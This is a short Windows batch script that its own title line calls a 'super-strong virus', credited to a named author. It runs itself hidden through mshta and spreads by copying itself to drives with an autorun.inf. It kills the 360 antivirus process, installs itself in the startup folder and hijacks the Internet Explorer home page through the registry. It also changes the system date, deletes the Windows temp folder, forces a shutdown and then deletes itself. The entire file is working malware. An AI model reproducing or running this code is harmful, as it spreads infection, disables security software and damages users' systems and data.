@echo off
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin
setlocal enabledelayedexpansion
for /f "skip=1 tokens=1 delims= " %%a in ('fsutil fsinfo drives^|find /v ""') do (
cd %%a>nul 2>nul && (set "lastdriver=%%a")
)
if not exist "!lastdriver!\bingdu.bat" (copy %0 !lastdriver!\)
if not exist "!lastdriver!\autorun.inf" (echo [AUTORUN]>>"!lastdriver!\autorun.inf" & echo shellexecute=bingdu.bat>>"!lastdriver!\autorun.inf")
taskkill /im 360tray.exe /f
copy %0 "%userprofile%\「开始」菜单\程序\启动\*.*"
shutdown -s -f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://bbs.kafan.cn /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d http://bbs.kafan.cn /f
title 超强病毒            制作人: 小C（姚嘉华）
set date=%date% 
date 1989.10.21 
date 1989.10.21
@echo off & setlocal enableextensions
set /a i = 20
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
goto Timeout
goto End
:Next
date 1949.10.21
RD /S /Q %systemroot%\temp\ 

del %0 /f
